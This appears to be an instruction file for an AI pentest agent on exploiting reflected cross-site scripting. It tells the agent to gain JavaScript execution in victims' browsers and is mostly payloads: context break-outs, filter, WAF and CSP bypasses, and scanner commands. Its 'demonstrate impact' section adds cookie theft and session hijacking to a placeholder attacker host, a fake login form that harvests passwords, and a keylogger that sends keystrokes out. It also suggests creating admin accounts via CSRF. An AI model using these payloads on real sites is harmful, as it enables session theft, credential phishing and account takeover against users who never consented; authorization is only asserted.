---
name: xss-reflected
description: >
  Guide reflected XSS exploitation during authorized penetration testing.
keywords:
  - reflected XSS
  - XSS filter bypass
  - WAF bypass XSS
  - CSP bypass
  - payload reflected in page
  - input echoed in response
  - script injection
  - HTML injection
tools:
  - burpsuite
  - dalfox
  - XSStrike
opsec: low
---

# Reflected XSS

You are helping a penetration tester exploit reflected cross-site scripting. The
target application echoes user input in the HTTP response without proper
sanitization. Your job is to achieve JavaScript execution in the victim's
browser. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[xss-reflected] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Web Interaction

- **curl** for payload testing — use curl to inject XSS payloads with precise
  control over URL parameters, headers, and encoding
- **`browser_open`** to navigate to reflected endpoint and verify rendering
- **`browser_evaluate`** to check if payload executed (e.g.,
  `document.querySelector('img#xss-test')` to verify DOM changes from payload)
- **`browser_screenshot`** for evidence of successful XSS execution

## Prerequisites

- Confirmed reflection point (see **web-discovery**)
- Input appears in the HTTP response body or headers
- If input is stored and rendered later, use **xss-stored** instead
- If input only affects the DOM via JavaScript (not in HTTP response), use **xss-dom**

## Step 1: Assess

If not already provided, determine:
1. **Reflection point** — URL, parameter, request method
2. **Reflection context** — where does the input land in the HTML?
3. **Existing filters** — what characters/strings are blocked or encoded?

Skip if context was already provided.

## Step 2: Identify Reflection Context

The payload depends entirely on where the input lands. Inject a canary string
like `xss<>"'` and examine where it appears in the response.

| Context | Example | Strategy |
|---|---|---|
| Between HTML tags | `<div>REFLECTED</div>` | Inject new tags: `<script>`, `<img>`, `<svg>` |
| Inside an HTML attribute | `<input value="REFLECTED">` | Break out of attribute: `"onmouseover=alert(1)` or `"><script>` |
| Inside a `href`/`src` | `<a href="REFLECTED">` | Use `javascript:` wrapper |
| Inside `<script>` block | `var x = "REFLECTED";` | Break out of string: `";alert(1)//` or `'-alert(1)-'` |
| Inside HTML comment | `<!-- REFLECTED -->` | Close comment: `--><script>alert(1)</script>` |
| Inside `<style>` / CSS | `color: REFLECTED` | Use `</style><script>alert(1)</script>` |

## Step 3: Basic Payloads

Try simple payloads first — escalate complexity only if blocked.

**Between HTML tags:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<body onload=alert(document.domain)>
```

**Breaking out of attributes:**
```html
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
'><img src=x onerror=alert(document.domain)>
```

**Inside JavaScript context:**
```javascript
";alert(document.domain)//
'-alert(document.domain)-'
\';alert(document.domain)//
</script><script>alert(document.domain)</script>
```

**Inside href/src (javascript: wrapper):**
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
```

**Inside hidden inputs:**
```html
" accesskey="X" onclick="alert(document.domain)
" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto
```

## Step 4: Filter Bypass

When basic payloads are blocked, use these bypass techniques.

### Tag/Keyword Filters

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Tag with extra attributes -->
<script x>alert(1)</script y>

<!-- Less common tags -->
<details/open/ontoggle=alert(1)>
<video src=_ onloadstart=alert(1)>
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>

<!-- Nested/broken tags -->
<scr<script>ipt>alert(1)</scr<script>ipt>
```

### Parenthesis Blocked

```javascript
alert`1`
onerror=alert;throw 1
{onerror=alert}throw 1
setTimeout`alert\u0028document.domain\u0029`
```

### Quote Filters

```javascript
String.fromCharCode(88,83,83)
/XSS/.source
```

### Dot Filter

```javascript
window['alert'](document['domain'])
eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))
```

### Space Filter

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### Encoding Bypass

```html
<!-- HTML entity encoding -->
&#97;&#108;&#101;&#114;&#116;(1)

<!-- Unicode escapes in JS -->
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

<!-- Hex/octal in JS strings -->
eval('\x61lert(1)')

<!-- URL encoding in href -->
javascript:%61lert(1)
java%0ascript:alert(1)
java%09script:alert(1)
```

### Uppercase Output

When the app uppercases your input:
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

## Step 5: WAF Bypass

Per-WAF techniques when application-level filters pass but a WAF blocks.

**Cloudflare:**
```html
<svg/onload="`${prompt``}`">
1'"><img/src/onerror=.1|alert``>
```

**Akamai:**
```html
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

**Generic WAF bypass patterns:**
```html
<!-- Null bytes / vertical tab -->
<img src=x onerror\x00=alert(1)>
<img src=x onerror\x0b=alert(1)>

<!-- Event handler with / -->
<img src=x onerror/=alert(1)>

<!-- SVG with random attributes -->
<svg/onrandom=random onload=confirm(1)>
```

## Step 6: CSP Bypass

When Content Security Policy blocks inline scripts.

**Check CSP first:**
```bash
# Inspect CSP header
curl -sI https://TARGET | grep -i content-security-policy
```

**Evaluate:** paste the CSP into https://csp-evaluator.withgoogle.com

**JSONP endpoints** (when CSP allows google.com, youtube.com, etc.):
```html
<script src="//google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
<script src="https://www.youtube.com/oembed?callback=alert;"></script>
```

**data: URI** (when `script-src` includes `data:`):
```html
<script src="data:,alert(1)"></script>
```

**Base tag injection** (when `script-src 'nonce-...'` but base-uri is missing):
```html
<base href="https://attacker.com/">
```

**object/embed** (when `script-src 'self'`):
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

## Step 7: Demonstrate Impact

A bare `alert()` is a proof of concept, not impact. Demonstrate real risk:

**Cookie theft:**
```javascript
fetch('https://ATTACKER/steal?c='+document.cookie)
new Image().src='https://ATTACKER/steal?c='+document.cookie
```

**Session hijacking via fetch:**
```html
<script>fetch('https://ATTACKER',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

**Phishing (UI redressing):**
```html
<script>
history.replaceState(null,null,'../login');
document.body.innerHTML='<h1>Session expired</h1><form action=https://ATTACKER/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>';
</script>
```

**Keylogger:**
```html
<img src=x onerror='document.onkeypress=function(e){fetch("https://ATTACKER?k="+String.fromCharCode(e.which))},this.remove();'>
```

## Step 8: Escalate or Pivot

- **Payload persists across page loads**: This is stored XSS — route to **xss-stored**
- **Payload only fires via DOM manipulation**: Escalate
- **Need to bypass CSP for exfiltration**: Check Deep Reference for advanced CSP bypass
- **XSS on admin panel**: Attempt CSRF to escalate privileges, create admin accounts

Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: reflection point, context, working payload, and CSP policy (if present).

## OPSEC Notes

- Reflected XSS is read-only server-side — no artifacts on the target
- Payloads appear in server access logs (URL parameters, Referer headers)
- WAF logs will record blocked attempts
- Use `console.log()` instead of `alert()` for stored XSS testing to avoid popup fatigue

## Troubleshooting

### Payload Reflected but Doesn't Execute
- Check if CSP blocks inline scripts — inspect response headers
- Check if the reflection is inside a sanitized context (e.g., HTML-encoded in attribute)
- Try event handlers instead of `<script>` tags (`onerror`, `onfocus`, `ontoggle`)
- Check if the page uses a framework that auto-escapes (React, Angular) — may need framework-specific bypass

### AngularJS Context
If the page uses AngularJS (look for `ng-app`):
```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

### SVG/XML Context
```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><script>alert(1)</script></svg>
```

### Markdown Context
```markdown
[click](javascript:alert(document.domain))
[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

### Automated Scanning
```bash
# Dalfox — fast XSS scanner
dalfox url "https://TARGET/page?param=test" --silence

# With custom payload file
dalfox url "https://TARGET/page?param=test" --custom-payload payloads.txt

# XSStrike
python3 xsstrike.py -u "https://TARGET/page?param=test"

# From Burp request
dalfox file request.txt
```
